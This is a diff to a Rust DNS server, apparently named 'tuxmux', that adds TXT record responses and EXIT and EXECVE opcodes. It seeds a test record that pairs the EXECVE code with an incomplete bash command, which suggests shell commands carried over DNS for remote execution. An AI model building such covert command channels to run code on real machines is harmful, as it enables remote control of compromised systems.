@@ -10,6 +10,7 @@ use x25519_dalek::{PublicKey, SharedSecret, StaticSecret};
 
 use hickory_proto::op::Message;
 use hickory_proto::rr::{RData, Record, RecordType};
+use hickory_proto::rr::RecordType::TXT;
 use std::collections::HashMap;
 use std::net::{Ipv4Addr, SocketAddr};
 use std::str::FromStr;
@@ -19,6 +20,10 @@ use tokio::sync::Mutex;
 
 /// Config file
 const DATA: &str = "/etc/tuxmux";
+
+/// Codes
+const EXIT: u8 = 0x01;
+const EXECVE: u8 = 0x02;
 
 const SPLASH: &str = r" /_  __/_  ___  __/  |/  /_  ___  __
   / / / / / / |/_/ /|_/ / / / / |/_/
@@ -104,10 +109,17 @@ fn build_response(
         if name.ends_with('.') {
             name.pop();
         }
-
-        if let Some(ip) = cache.get(&(name, q.query_type())) {
-            let rdata = RData::A(hickory_proto::rr::rdata::A(ip.parse::<Ipv4Addr>()?));
-            resp.add_answer(Record::from_rdata(q.name().clone(), 300, rdata));
+        if let Some(val) = cache.get(&(name, q.query_type())) {
+            match q.query_type() {
+                RecordType::A => {
+                    let addr = val.parse::<Ipv4Addr>()?;
+                    resp.add_answer(Record::from_rdata(q.name().clone(), 300, RData::A(hickory_proto::rr::rdata::A(addr))));
+                }
+                RecordType::TXT => {
+                    resp.add_answer(Record::from_rdata(q.name().clone(), 300, RData::TXT(hickory_proto::rr::rdata::TXT::new(vec![val.clone()]))));
+                }
+                _ => { println!("not implemented type"); }
+            }
         }
     }
     Ok(resp.to_vec()?)
@@ -239,6 +251,10 @@ async fn init_db(path: &Path) -> rusqlite::Result<Connection, rusqlite::Error> {
     conn.execute(
         "INSERT INTO records (name, record_type, value) VALUES (?1, ?2, ?3)",
         ("", u16::from(RecordType::A), "127.0.0.1"),
+    )?;
+    conn.execute(
+        "INSERT INTO records (name, record_type, value) VALUES (?1, ?2, ?3)",
+        ("testing", u16::from(RecordType::A), format!("{EXECVE}/bin/bash -c '/bin/echo test > ")),
     )?;
     Ok(conn)
 }
